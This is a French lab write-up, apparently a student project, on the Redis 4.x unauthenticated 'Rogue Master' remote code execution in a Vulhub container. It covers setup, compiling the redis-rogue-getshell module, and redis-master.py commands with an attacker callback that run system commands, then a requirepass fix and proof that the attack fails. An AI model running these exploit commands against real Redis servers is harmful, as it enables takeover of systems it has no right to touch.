# Redis Post Exploitation Due to Master and Slave Synchronisation
## Présentation du logiciel

Redis est une base de données en mémoire haute performance comme oracle ou mongoDB, utilisée par des géants comme Twitter, Airbnb ou Uber pour la gestion de cache, les files d'attente ou les sessions utilisateurs. Sa capacité à répondre en moins d'une milliseconde en fait un pilier critique des infrastructures web modernes.

La sécurité de Redis est capitale car il ne s'agit pas d'un simple cache temporaire. Une instance compromise peut entraîner des conséquences désastreuses : vol de données sensibles, minage de cryptomonnaie (cryptojacking) et surtout, comme nous le verrons, une exécution de code à distance (RCE) permettant à l'attaquant de prendre le contrôle total du serveur.

## Chargement de l'image Vulhub

Nous utilisons l'environnement Vulhub pour déployer le scénario redis/4-unacc via Docker.

Ce dossier simule une installation de Redis 4.x "Unauthenticated". Cela correspond à une erreur de configuration fréquente où le service est installé par défaut sans mot de passe et exposé sur le réseau, laissant le port 6379 accessible à n'importe qui.

### Création et lancement du conteneur
```
git clone https://github.com/vulhub/vulhub
cd vulhub/redis/4-unacc
sudo docker-compose up -d
```

### Vérification du fonctionnement
Nous vérifions que le serveur est accessible sans restriction.
```
redis-cli -h ip-du-serveur
```
Cela devrait retourner l'invite de commande redis.

## Présentation de la vulnérabilité

La faille exploitée repose sur le détournement du mécanisme légitime de synchronisation Maître-Esclave de Redis, combiné au chargement dynamique de modules apparu dans les versions 4.x.

Redis permet à un serveur de devenir l'esclave d'un autre pour répliquer les données. Lors de cette connexion, le protocole impose une synchronisation complète : le maître envoie sa base de données sous forme de fichier binaire, que l'esclave télécharge, écrit sur son disque et charge en mémoire.

L'attaque "Rogue Master" abuse de ce fonctionnement :

1. Usurpation du Maître : L'attaquant configure un serveur Redis malveillant et force la victime (via la commande SLAVEOF) à se connecter à lui comme esclave.

2. Synchronisation Piégée : Au lieu d'envoyer une base de données légitime, le faux maître envoie un module malveillant (code compilé .so). La victime, respectant le protocole de synchronisation, écrit ce fichier sur son disque système.

3. Exécution du code (RCE) : Une fois le fichier présent physiquement sur le disque, l'attaquant utilise la commande MODULE LOAD pour l'injecter dans le processus Redis. Cela permet d'exécuter des commandes système arbitraires avec les droits du service Redis.

## Exploit de la vulnérabilité

Nous utilisons l'outil [redis-rogue-getshell]() qui automatise l'attaque "Rogue Master"

### Préparation de l'outil
Nous clonons le dépôt. Notez qu'une modification du code source est nécessaire sur les systèmes récents pour éviter une erreur de compilation.
```
git clone https://github.com/vulhub/redis-rogue-getshell
cd redis-rogue-getshell
nano /home/kali/vulhub/redis/4-unacc/redis-rogue-getshell/RedisModulesSDK/exp/exp.c
```

```c
#include <string.h>
#include <arpa/inet.h>
```

### Compilation du code malveillant
```
cd ../
make
cd ../
```
### Execution de l'attaque

Nous lançons le script Python en définissant l'IP de la victime (-r) et notre IP d'attaquant (-L) pour le callback.

Test 1 : Obtention de l'identité (Preuve RCE)
```
python3 redis-master.py -r <ip-attaquant> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "id"
```

Test 2 : Création de fichier (Preuve de persistance)
```
python3 redis-master.py -r <ip-victime> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "touch /tmp/PreuveDeHack"
```
On peut ensuite vérifier sur la victime que le fichier /tmp/PreuveDeHack existe.
```
sudo docker exec -it <id-du-conteneur> ls -l /tmp/
```

## Explication de la raison pour laquelle l’exploit fonctionne

L'exploit repose sur la chaîne d'événements suivante, rendue possible par l'absence d'authentification :

1. Imitation du Maître : Le script d'attaque se comporte comme un serveur Redis Maître et envoie la commande SLAVEOF à la victime. La victime, configurée sans sécurité, accepte de devenir l'esclave de l'attaquant.

2. Synchronisation Malveillante : Le protocole de réplication Redis impose une synchronisation complète. L'attaquant envoie alors le module malveillant (exp.so) sous forme de flux de données binaires, que la victime écrit sur son disque.

3. Chargement de Module : Une fois le fichier sur le disque, l'attaquant envoie la commande MODULE LOAD ./exp.so. Redis charge ce code compilé en mémoire.

4. Exécution : Le module chargé ajoute une nouvelle commande (ici system.exec) qui permet de passer des commandes directement au système d'exploitation sous l'identité de l'utilisateur Redis.


## Proposition justifiée d’un correctif

Pour déterminer le correctif adéquat, nous avons analysé la chaîne d'attaque et évalué les mécanismes de sécurité disponibles dans cette version de Redis.

### Analyse de la cause racine
L'attaque réussit car le serveur accepte aveuglément des commandes critiques (CONFIG, SLAVEOF, MODULE LOAD) de n'importe quel utilisateur connecté. Le problème fondamental n'est pas l'existence de ces commandes (qui sont utiles), mais l'absence de contrôle sur qui a le droit de les exécuter.

### Évaluation des solutions possibles 
Conformément aux contraintes du projet, la mise à jour vers Redis 6 (qui possède des ACLs fines) est interdite. Il nous reste deux options de configuration :  

1. Option A : Renommer ou désactiver les commandes dangereuses (rename-command).

- Avantage : Empêche spécifiquement l'usage de MODULE ou CONFIG.

- Inconvénient : Complexe à mettre en œuvre sans fichier de configuration (redis.conf) et risque de casser des outils d'administration légitimes qui dépendent de ces commandes.

2. Option B : Activer l'authentification (requirepass).

- Avantage : Bloque l'accès à toutes les commandes pour toute personne non autorisée. C'est la mesure de sécurité native prévue par les concepteurs de Redis pour ce scénario.

### Solution retenue
Nous choisissons l'activation de l'authentification. C'est la solution la plus robuste car elle applique une défense en profondeur : au lieu de courir après chaque commande dangereuse, nous bloquons l'accès initial au serveur. Sans le mot de passe, l'attaquant ne peut même pas initier le dialogue avec le serveur, neutralisant l'attaque à l'étape 0.

## Application du correctif

L'image Docker utilisée étant minimaliste (pas d'éditeur de texte ni de fichier redis.conf par défaut), nous appliquons le correctif directement en mémoire via la commande CONFIG SET. Cela sécurise le serveur immédiatement sans redémarrage.

Sur la VM victime :
```
edis-cli -h 127.0.0.1                                   
127.0.0.1:6379> CONFIG SET requirepass "Securite123!"
OK
127.0.0.1:6379> exit
```

## Démonstration que l’exploit ne fonctionne plus

### Vérification manuelle
Nous tentons de lister les clés sans mot de passe. L'accès doit être refusé.
```
edis-cli -h 192.168.125.128                            
192.168.125.128:6379> KEYS *
(error) NOAUTH Authentication required.
192.168.125.128:6379> exit
```

### Échec du script d'attaque
Nous relançons le script d'exploitation. Celui-ci échoue désormais car il ne peut plus s'authentifier pour envoyer les commandes de configuration.
```
python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.129 -P 8888 -f RedisModulesSDK/exp.so -c "id"
```
Sortie observée : 
```
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$15\r\n192.168.125.129\r\n$4\r\n8888\r\n'
>> receive data: b'-NOAUTH Authentication required.\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'-NOAUTH Authentication required.\r\n'
```
L'attaque est bloquée par l'erreur NOAUTH.
